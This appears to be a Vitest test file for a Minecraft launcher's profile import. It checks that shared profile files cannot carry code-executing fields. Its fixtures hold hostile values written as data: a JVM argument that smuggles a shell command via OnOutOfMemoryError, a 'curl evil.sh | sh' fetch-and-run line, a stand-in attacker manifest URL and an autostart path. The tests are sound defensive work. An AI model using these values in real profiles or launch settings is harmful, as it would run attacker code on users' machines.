import { describe, it, expect } from 'vitest';
import { readImportedProfile } from '../src/core/profiles/profile-manager';

/**
 * What a profile export is allowed to bring with it.
 *
 * A profile file gets passed around — posted in a Discord channel, attached to
 * a forum reply. Two of its fields reach a process at the next launch:
 * `customJavaPath` chooses the binary `spawn` runs, and `javaArgs` is spliced
 * into the JVM's own argument list (`-XX:OnOutOfMemoryError=…` is a command).
 * Before this an "here's my profile" attachment ran whatever its author liked
 * on the machine that opened it, with no step at which anyone was asked.
 *
 * The last case here is the other half of that rule: a field the schema does
 * not declare never reaches a profile at all, which is what keeps an export
 * from resurrecting one the launcher has since dropped.
 */

const exported = {
  id: 'b0a1c2d3-0000-0000-0000-000000000000',
  name: 'Ravens',
  minecraftVersion: '1.21.4',
  modLoader: 'fabric',
  allocatedRamMb: 4096,
  createdAt: '2026-01-01T00:00:00.000Z',
  updatedAt: '2026-01-01T00:00:00.000Z',
};

const importOf = (extra: Record<string, unknown> = {}) =>
  readImportedProfile(JSON.stringify({ ...exported, ...extra }));

describe('readImportedProfile', () => {
  it('keeps the fields that describe a profile', () => {
    const { data } = importOf({ serverIp: 'mc.example.net', allocatedRamMb: 8192 });
    expect(data).toMatchObject({
      name: 'Ravens',
      minecraftVersion: '1.21.4',
      modLoader: 'fabric',
      serverIp: 'mc.example.net',
      allocatedRamMb: 8192,
    });
  });

  it('never carries a custom Java path across', () => {
    const { data, dropped } = importOf({ customJavaPath: '/tmp/not-a-jvm' });
    expect(data).not.toHaveProperty('customJavaPath');
    expect(dropped).toContain('customJavaPath');
  });

  it('never carries JVM arguments across — they are an execution surface', () => {
    // `-XX:OnOutOfMemoryError=` runs a shell command; the token has no space, so
    // splitting on whitespace keeps it whole and the JVM runs it on the next OOM.
    const { data, dropped } = importOf({
      javaArgs: '-XX:OnOutOfMemoryError=touch$IFS/tmp/pwned',
    });
    expect(data).not.toHaveProperty('javaArgs');
    expect(dropped).toContain('javaArgs');
  });

  it('never carries a manifest URL across — it would auto-follow a mod source', () => {
    // A pack-following profile re-syncs its manifest on every launch, installing
    // and running whatever mods it lists. With no trusted key configured (the
    // default) an unsigned third-party manifest is accepted, so an imported file
    // that kept this would quietly subscribe the importer to the sender's mod
    // source. Re-adding the pack from the catalogue is where the source is shown.
    const { data, dropped } = importOf({ manifestUrl: 'https://evil.example/manifest.json' });
    expect(data).not.toHaveProperty('manifestUrl');
    expect(dropped).toContain('manifestUrl');
  });

  it('reports nothing dropped for an ordinary profile', () => {
    expect(importOf().dropped).toEqual([]);
  });

  it('drops the launcher-assigned fields so an import is a new profile', () => {
    const { data } = importOf({ lastPlayed: '2026-05-01T00:00:00.000Z', totalPlayTimeMinutes: 90 });
    expect(data).not.toHaveProperty('id');
    expect(data).not.toHaveProperty('createdAt');
    expect(data).not.toHaveProperty('lastPlayed');
    expect(data).not.toHaveProperty('totalPlayTimeMinutes');
  });

  it('does not let unknown fields ride along', () => {
    const { data } = importOf({ somethingElse: 'x' });
    expect(data).not.toHaveProperty('somethingElse');
  });

  it('cannot be made to revive a field the launcher has dropped', () => {
    // Both were real fields once, and both reached a shell or the filesystem.
    // Nothing declares them now, so the parse leaves them behind without
    // needing a rule of their own — which is what makes removing a field a
    // complete removal rather than a missing UI.
    const { data } = importOf({
      preLaunchCommand: 'curl evil.sh | sh',
      gameDirectory: '/home/victim/.config/autostart',
    });
    expect(data).not.toHaveProperty('preLaunchCommand');
    expect(data).not.toHaveProperty('gameDirectory');
  });

  it('rejects a file that is not a profile', () => {
    expect(() => readImportedProfile('[]')).toThrow(/does not contain a profile/);
    expect(() => readImportedProfile('"hello"')).toThrow(/does not contain a profile/);
    expect(() => readImportedProfile('{"name":"x"}')).toThrow(/not a valid profile/);
  });

  it('accepts an export that predates the id and timestamps being written', () => {
    const { id: _id, createdAt: _c, updatedAt: _u, ...bare } = exported;
    expect(readImportedProfile(JSON.stringify(bare)).data.name).toBe('Ravens');
  });
});
